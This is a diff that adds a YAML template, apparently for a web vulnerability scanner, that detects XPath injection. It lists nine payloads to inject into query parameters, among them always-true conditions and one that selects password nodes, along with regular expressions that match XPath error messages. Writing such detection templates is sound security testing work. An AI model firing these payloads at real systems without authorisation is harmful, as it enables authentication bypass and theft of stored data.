@@ -1,0 +1,32 @@
+id: xpath-injection
+info:
+  name: "XPath Injection"
+  severity: high
+  description: "Detects XPath injection via query manipulation and error messages"
+  tags: [xpath, injection, xml]
+  author: Wired
+
+inject: query_params
+detection: pattern
+
+payloads:
+  - "' or '1'='1"
+  - "' or ''='"
+  - "1' or '1'='1' or '1'='1"
+  - "'] | //user/*[1='"
+  - "') or ('1'='1"
+  - "1 or 1=1"
+  - "' or count(//*)>0 or '1'='1"
+  - "' or string-length(name(/*[1]))>0 or '1'='1"
+  - "x']/..//password | a['"
+
+matchers:
+  body_patterns:
+    - "(?i)XPath.*error"
+    - "(?i)XPathException"
+    - "(?i)Invalid.*XPath"
+    - "(?i)XPATH syntax error"
+    - "(?i)DOMXPath"
+    - "(?i)SimpleXMLElement"
+    - "(?i)lxml\\.etree"
+    - "(?i)xmlXPathEval"
